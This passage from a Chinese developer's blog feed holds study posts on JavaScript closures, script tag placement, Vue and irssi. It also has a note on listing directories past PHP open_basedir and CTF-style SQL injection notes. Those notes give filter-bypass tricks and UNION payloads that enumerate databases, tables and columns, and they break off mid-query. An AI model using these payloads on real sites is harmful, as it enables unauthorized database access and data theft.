<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a_list = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>);</div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</div><div class="line">    a_list[i].onclick = (<span class="function"><span class="keyword">function</span>(<span class="params">arg_i</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            alert(arg_i);</div><div class="line">        &#125;</div><div class="line">    &#125;)(i);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>当时感觉这种写法特别帅</p>
<blockquote>
<p>别写错了.要return一个function的,别把alert写在立即执行的匿名函数里</p>
</blockquote>
<h3 id="剩下几种就是今天学到的了"><a href="#剩下几种就是今天学到的了" class="headerlink" title="剩下几种就是今天学到的了"></a>剩下几种就是今天学到的了</h3><ol>
<li>把i存到每个对象里<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a_list = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>);</div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</div><div class="line">    a_list[i].arg = i;</div><div class="line">    a_list[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        alert(<span class="keyword">this</span>.i);</div><div class="line">    &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>不够帅气,但很简单直观</p>
<ol>
<li>匿名函数往外写了一层?<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a_list = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>);</div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</div><div class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">arg</span>) </span>&#123;</div><div class="line">        a_list[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            alert(arg);</div><div class="line">        &#125;;</div><div class="line">    &#125;)(i);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>其实相当于把i变量绑定到匿名函数里作为一个局部变量(其实个人感觉传进来的参数和局部变量在很多地方都是相似的)了,相当于是利用了传说中的函数作用域</p>
<ol>
<li>这次是真的用了一个局部变量<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a_list = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>);</div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</div><div class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> arg = i; <span class="comment">//这个arg虽然用了var但不是全局变量</span></div><div class="line">        a_list[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            alert(arg);</div><div class="line">        &#125;;</div><div class="line">    &#125;)();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>好了皆大欢喜<br>另外,看到一句话</p>
<blockquote>
<p>绝大多数的同步的地方改成异步都都可以用上述方法，只要将需要异步的部分（通常是从某一行开始到函数末尾）包含在闭包中，就可以进行异步处理了</p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[script标签到地方在哪里]]></title>
      <url>/2017/05/23/script%E6%A0%87%E7%AD%BE%E5%88%B0%E5%9C%B0%E6%96%B9%E5%9C%A8%E5%93%AA%E9%87%8C/</url>
      <content type="html"><![CDATA[<h2 id="回想一下"><a href="#回想一下" class="headerlink" title="回想一下"></a>回想一下</h2><p>在最开始写前端的时候是把script放到head里的</p>
<p>后来随着岁月流逝,时间推移,大概是看到许多许多的人说要把script放到body标签结束之前的那个位置</p>
<p>后来有人,,,把他放到body外边了…我大概是跟不上社会的发展了,,,后来看大家说这个是不好的,或者不太正确的,所以我也就不纠结了</p>
<h2 id="惨啊"><a href="#惨啊" class="headerlink" title="惨啊"></a>惨啊</h2><p>好好看一下<br>这一段超赞(从第一个参考链接抄出来的)<br>浏览器的渲染过程</p>
<pre><code>Create/Update DOM And request css/image/js：浏览器请求到HTML代码后，在生成DOM的最开始阶段（应该是 Bytes → characters 后），并行发起css、图片、js的请求，无论他们是否在HEAD里。
注意：发起 js 文件的下载 request 并不需要 DOM 处理到那个 script 节点，比如：简单的正则匹配就能做到这一点，虽然实际上并不一定是通过正则：）。这是很多人在理解渲染机制的时候存在的误区。

Create/Update Render CSSOM：CSS文件下载完成，开始构建CSSOM

Create/Update Render Tree：所有CSS文件下载完成，CSSOM构建结束后，和 DOM 一起生成 Render Tree。

Layout：有了Render Tree，浏览器已经能知道网页中有哪些节点、各个节点的CSS定义以及他们的从属关系。下一步操作称之为Layout，顾名思义就是计算出每个节点在屏幕中的位置。

Painting：Layout后，浏览器已经知道了哪些节点要显示（which nodes are visible）、每个节点的CSS属性是什么（their computed styles）、每个节点在屏幕中的位置是哪里（geometry）。就进入了最后一步：Painting，按照算出来的规则，通过显卡，把内容画到屏幕上。
</code></pre><p>以上五个步骤前3个步骤之所有使用 “Create/Update” 是因为DOM、CSSOM、Render Tree都可能在第一次Painting后又被更新多次，比如JS修改了DOM或者CSS属性。</p>
<pre><code>DOM：Document Object Model，浏览器将HTML解析成树形的数据结构，简称DOM。
CSSOM：CSS Object Model，浏览器将CSS代码解析成树形的数据结构
Render Tree：DOM 和 CSSOM 合并后生成 Render Tree(Render Tree 和DOM一样，以多叉树的形式保存了每个节点的css属性、节点本身属性、以及节点的孩子节点，display:none 的节点不会被加入 Render Tree，而 visibility: hidden 则会，所以，如果某个节点最开始是不显示的，设为 display:none 是更优的。
</code></pre><blockquote>
<p>看完之后还是一脸懵逼</p>
</blockquote>
<p>然后又看到了第三篇的文章中说道,第一篇文章中受到争议的部分,于是又是读啊读<br>这个第三篇文章超赞</p>
<blockquote>
<p>浏览器不是解析一个标签就绘制显示一次，当遇到阻塞或者比较耗时的操作的时候才会先绘制一部分解析好的。</p>
</blockquote>
<p>看完了参考资料<br>得出来一个结论我还是放到后面吧</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://segmentfault.com/a/1190000004292479" target="_blank" rel="external">https://segmentfault.com/a/1190000004292479</a> (另外阔以关注一下这个人的blog,整个内容比较赞)<br><a href="https://www.zhihu.com/question/20027966" target="_blank" rel="external">https://www.zhihu.com/question/20027966</a> (为什么把 Script 标签放在 body 结束标签之后 html 结束标签之前)<br><a href="https://segmentfault.com/a/1190000007766425#articleHeader2" target="_blank" rel="external">https://segmentfault.com/a/1190000007766425#articleHeader2</a></p>
<h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><p>JavaScript DOM 编程艺术</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[todo]]></title>
      <url>/2017/05/22/todo-2/</url>
      <content type="html"><![CDATA[<p>看bendawang师傅的<br><a href="http://bendawang.site/article/Burp-Suite%E5%8A%9F%E8%83%BD%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D" target="_blank" rel="external">http://bendawang.site/article/Burp-Suite%E5%8A%9F%E8%83%BD%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D</a><br>还有flask入门一二三</p>
<p>看firesun的这个<br><a href="http://www.firesun.me/san-ge-bai-mao-zhi-zhao-pin-you-kai-shi-liao-ni-pa-liao-ma-writeup/?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">http://www.firesun.me/san-ge-bai-mao-zhi-zhao-pin-you-kai-shi-liao-ni-pa-liao-ma-writeup/?utm_source=tuicool&amp;utm_medium=referral</a></p>
<p>读venenof和ph的文章</p>
<p>学Vue</p>
<p>学六级</p>
<p>看买回来的书,,,那个</p>
<p>学webpack</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[windows短文件名]]></title>
      <url>/2017/05/22/windows%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D/</url>
      <content type="html"><![CDATA[<h2 id="第一次知道"><a href="#第一次知道" class="headerlink" title="第一次知道"></a>第一次知道</h2><p><a href="http://bendawang.site/article/TWCTF-2016-(Tokyo%20Westerns%20CTF%20)-WEB-WriteUp" target="_blank" rel="external">http://bendawang.site/article/TWCTF-2016-(Tokyo%20Westerns%20CTF%20)-WEB-WriteUp</a></p>
<h2 id="好奇啊…"><a href="#好奇啊…" class="headerlink" title="好奇啊…"></a>好奇啊…</h2>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[绕过open_basedir列目录]]></title>
      <url>/2017/05/22/%E7%BB%95%E8%BF%87open-basedir%E5%88%97%E7%9B%AE%E5%BD%95/</url>
      <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>看ph牛的这篇文章</p>
<p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="external">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></p>
<p>然后看到了提到了 <code>Glob</code> , 然后回忆起来,,yi好熟悉啊<br>翻了翻自己在 <code>2017/04/06</code> 记得一篇日记…<br>里面有写到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>(glob(<span class="string">"./*"</span>) <span class="keyword">as</span> $bdw)&#123; <span class="keyword">echo</span> $bdw.<span class="string">"&lt;br&gt;"</span>; &#125;<span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>##<br>好吧,人家文章里说的是一个<code>glob://</code></p>
<h2 id="文章写得超赞…"><a href="#文章写得超赞…" class="headerlink" title="文章写得超赞…"></a>文章写得超赞…</h2><p>尤其是利用Windows下两个特殊的通配符：&lt;、&gt; + realpath 来暴力枚举的</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[不错的文章]]></title>
      <url>/2017/05/20/%E4%B8%8D%E9%94%99%E7%9A%84%E6%96%87%E7%AB%A0/</url>
      <content type="html"><![CDATA[<h2 id="超赞"><a href="#超赞" class="headerlink" title="超赞"></a>超赞</h2><p><a href="https://www.leavesongs.com/PENETRATION/arbitrary-files-read-via-static-requests.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/arbitrary-files-read-via-static-requests.html</a></p>
<p>计划每天读ph牛几篇文章,发现ph牛是xd的,,,当时真的真的超级羡慕能去西电的<br>还有L-Team的wp</p>
<p>看他大概是从13年开始参加CTF<br>xdctf平台第一个版本仿佛也是他写的<br>好像Ph是xdsec L-Team的第一届成员</p>
<p>我14年入学,当时并不知道有CTF这种东西,真是惭愧==</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Vue]]></title>
      <url>/2017/05/20/Vue/</url>
      <content type="html"><![CDATA[<p>看到RCTF里有道题是<code>Flask</code> + <code>Vue</code> 的题目<br>想快速入门一下<code>Vue</code><br>这个题目看起来应该是<code>Flask</code>只是做API接口</p>
<h2 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h2><p>Vue是<code>MVVM</code>(Model-View-ViewModel)框架</p>
<p>View<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line">    &#123;&#123; message &#125;&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>Model<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Data = &#123;</div><div class="line">    message: <span class="string">'Hello'</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>ViewModel<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">new</span> Vue(&#123;</div><div class="line">  el: <span class="string">'#app'</span>, <span class="comment">// View</span></div><div class="line">  data: Data <span class="comment">//Model</span></div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<p>ViewModel相当于把<code>view</code>和<code>Model</code>绑定起来</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"message"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../vue.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">    el: <span class="string">'#app'</span>,</span></div><div class="line"><span class="undefined">    data: &#123;</span></div><div class="line"><span class="javascript">        message: <span class="string">'init'</span></span></div><div class="line"><span class="undefined">    &#125;</span></div><div class="line"><span class="undefined">&#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<blockquote>
<p>另外: 每个Vue实例都会代理其选项对象里的data属性<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> v = <span class="keyword">new</span> Vue(&#123;</div><div class="line">    el: <span class="string">'#xxx'</span>,</div><div class="line">    data: &#123;</div><div class="line">        message: <span class="string">'xxxx'</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;)</div><div class="line">v.message</div><div class="line"><span class="comment">// =&gt; 'xxxx'</span></div></pre></td></tr></table></figure></p>
</blockquote>
<h2 id="一些预定义的实例属性"><a href="#一些预定义的实例属性" class="headerlink" title="一些预定义的实例属性"></a>一些预定义的实例属性</h2><p>vm.$data<br>vm.$el</p>
<h2 id="生命周期和钩子"><a href="#生命周期和钩子" class="headerlink" title="生命周期和钩子"></a>生命周期和钩子</h2><p>钩子的 this 指向调用它的 Vue 实例<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</div><div class="line">  data: &#123;</div><div class="line">    a: <span class="number">1</span></div><div class="line">  &#125;,</div><div class="line">  created: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// `this` 指向 vm 实例</span></div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'a is: '</span> + <span class="keyword">this</span>.a)</div><div class="line">  &#125;</div><div class="line">&#125;)</div><div class="line"><span class="comment">// -&gt; "a is: 1"</span></div></pre></td></tr></table></figure></p>
<p>生命周期图示在官网有<br>看起来大概是有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">beforeCreate created beforeMount mounted</div><div class="line">beforeUpdate updated activated deactivated</div><div class="line">beforeDestroy destroyed</div></pre></td></tr></table></figure></p>
<p>这么多</p>
<h2 id="vue-source"><a href="#vue-source" class="headerlink" title="vue-source"></a>vue-source</h2><p>就像是jQuery里的<code>$.ajax</code>,用来和后端进行数据交互<br>是Vue的一个插件</p>
<blockquote>
<p>A Vue instance provides the this.$http service which can send HTTP requests</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// global Vue object</span></div><div class="line">Vue.http.get(<span class="string">'/someUrl'</span>, [options]).then(successCallback, errorCallback);</div><div class="line">Vue.http.post(<span class="string">'/someUrl'</span>, [body], [options]).then(successCallback, errorCallback);</div><div class="line"></div><div class="line"><span class="comment">// in a Vue instance</span></div><div class="line"><span class="keyword">this</span>.$http.get(<span class="string">'/someUrl'</span>, [options]).then(successCallback, errorCallback);</div><div class="line"><span class="keyword">this</span>.$http.post(<span class="string">'/someUrl'</span>, [body], [options]).then(successCallback, errorCallback);</div></pre></td></tr></table></figure>
<p><em>发现大部分的vm.$methodName 都是 Vue.methodName 的别名</em></p>
<p>使用resource也可以达到类似的效果(那为什么提供了http和resource两种方法)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">get: &#123;<span class="attr">method</span>: <span class="string">'GET'</span>&#125;,</div><div class="line">save: &#123;<span class="attr">method</span>: <span class="string">'POST'</span>&#125;,</div><div class="line">query: &#123;<span class="attr">method</span>: <span class="string">'GET'</span>&#125;,</div><div class="line">update: &#123;<span class="attr">method</span>: <span class="string">'PUT'</span>&#125;,</div><div class="line">remove: &#123;<span class="attr">method</span>: <span class="string">'DELETE'</span>&#125;,</div><div class="line"><span class="keyword">delete</span>: &#123;<span class="attr">method</span>: <span class="string">'DELETE'</span>&#125;</div><div class="line"><span class="comment">// Vue.resource or vm.$resource</span></div></pre></td></tr></table></figure></p>
<p>一个栗子<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">new</span> Vue(&#123;</div><div class="line">    data:</div><div class="line">    &#123;</div><div class="line">        apiUrl: <span class="string">'/api/download&#123;/token&#125;&#123;/fname&#125;'</span>,</div><div class="line">        filelist: [],</div><div class="line">    &#125;,</div><div class="line">    ......</div><div class="line">    method:&#123;</div><div class="line">        getFilelist: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></div><div class="line"><span class="function">        </span>&#123;</div><div class="line">            <span class="keyword">var</span> resource = <span class="keyword">this</span>.$resource(<span class="keyword">this</span>.apiUrl)</div><div class="line">            resource.get().then(</div><div class="line">                (response) =&gt; </div><div class="line">                &#123;</div><div class="line">                    <span class="keyword">this</span>.filelist = response.data</div><div class="line">                &#125;)</div><div class="line">        &#125;,</div><div class="line">		downloadFile: <span class="function"><span class="keyword">function</span>(<span class="params">n, t</span>)</span></div><div class="line"><span class="function">		</span>&#123;</div><div class="line">			<span class="keyword">var</span> resource = <span class="keyword">this</span>.$resource(<span class="keyword">this</span>.apiUrl)</div><div class="line">			resource.get(&#123;<span class="attr">fname</span>: n, <span class="attr">token</span>: t&#125;).then(</div><div class="line">				(response) =&gt;</div><div class="line">				&#123;</div><div class="line">					<span class="keyword">if</span>(response.data[<span class="string">'code'</span>] == <span class="number">1</span>)</div><div class="line">					&#123;</div><div class="line">						location.href = response.url</div><div class="line">					&#125;</div><div class="line">					<span class="keyword">else</span></div><div class="line">					&#123;</div><div class="line">						<span class="keyword">this</span>.getFilelist()</div><div class="line">						alert(response.data[<span class="string">'msg'</span>])</div><div class="line">					&#125;</div><div class="line">				&#125;)</div><div class="line">		&#125;</div><div class="line">        ......</div><div class="line">    &#125;</div><div class="line">    .....</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<p>看这个<code>apiUrl: &#39;/api/download{/token}{/fname}&#39;</code>，里面的<code>{/token}{/fname}</code>相当于可选参数<br>当调用<code>getFilelist</code>时候只请求<code>/api/download</code>，而当<code>downloadFile</code>时候<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">resource.get(&#123;<span class="attr">fname</span>: n, <span class="attr">token</span>: t&#125;)</div></pre></td></tr></table></figure></p>
<p>这里填上了<code>{/token}{/fname}</code>，hhhhh</p>
<p>那post data放在哪里，，，好像是这样子?<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">resource.post(&#123;arg-key:arg-value&#125;, &#123;post-key:post-value&#125;)</div></pre></td></tr></table></figure></p>
<p>就先看到这里</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[irc]]></title>
      <url>/2017/05/20/irc/</url>
      <content type="html"><![CDATA[<p>apt 了一个 irssi</p>
<h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><p>连接server /connect irc.freenode.net<br>加入房间 /join #channels</p>
<h2 id="懒得贴了"><a href="#懒得贴了" class="headerlink" title="懒得贴了"></a>懒得贴了</h2><p>需要的时候参考这个好了<br><a href="http://blog.csdn.net/donglin425/article/details/6967337" target="_blank" rel="external">http://blog.csdn.net/donglin425/article/details/6967337</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLi]]></title>
      <url>/2017/05/19/SQLi-2/</url>
      <content type="html"><![CDATA[<p>总感觉不会SQLi<br>昨天做了一道SQLi，感觉自己菜爆了</p>
<h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><p> 使用注释/**/<br> 使用某些%xx，比如%0a, %0d, %0c, %09<br> 使用括号,括号只能加在产生值的项两边</p>
<h3 id="逗号被过滤"><a href="#逗号被过滤" class="headerlink" title="逗号被过滤"></a>逗号被过滤</h3><p> limit处 =&gt; limit 1 offset 4<br> union处 =&gt; union select * from (select 1)a join (select 2)b<br> mid处   =&gt; mid(user() from 1 for 1)</p>
<h3 id="过滤了要查询的字段名"><a href="#过滤了要查询的字段名" class="headerlink" title="过滤了要查询的字段名"></a>过滤了要查询的字段名</h3><p> 比如说我要查第四字段<code>secret</code> =&gt; select i.4 from (select 1,2,3,4 union select * from news)i<br> =&gt; 然后由于过滤了逗号所以实际上payload是:<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> i<span class="number">.4</span> <span class="keyword">from</span> (</div><div class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">4</span>)d</div><div class="line">        <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">new</span> s)i</div></pre></td></tr></table></figure></p>
<h3 id="显示多条数据"><a href="#显示多条数据" class="headerlink" title="显示多条数据"></a>显示多条数据</h3><p> concat()<br> group_concat()<br> concat_ws()</p>
<h3 id="查看字段数"><a href="#查看字段数" class="headerlink" title="查看字段数"></a>查看字段数</h3><p> order by n<br> 昨天自己用了很蠢的方法:<br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'news'</span></div></pre></td></tr></table></figure></p>
<h3 id="过滤了单引号"><a href="#过滤了单引号" class="headerlink" title="过滤了单引号"></a>过滤了单引号</h3><p> 16进制代替字符串</p>
<h3 id="content"><a href="#content" class="headerlink" title="content"></a>content</h3> <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">查看mysql基本信息</div><div class="line"></div><div class="line">and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">concat_ws</span>(<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="number">0x7c</span>,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>()),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span></div><div class="line"></div><div class="line">查询数据库</div><div class="line"></div><div class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,schema_name,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata</div><div class="line"></div><div class="line">查询表名</div><div class="line"></div><div class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,table_name,<span class="number">5</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=数据库的<span class="number">16</span>进制编码 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">5</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=数据库的<span class="number">16</span>进制编码</div><div class="line"></div><div class="line">查询字段</div><div class="line"></div><div class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,column_name,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=表名的十六进制编码 <span class="keyword">and</span> table_schema=数据库的<span class="number">16</span>进制编码 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">from</span> 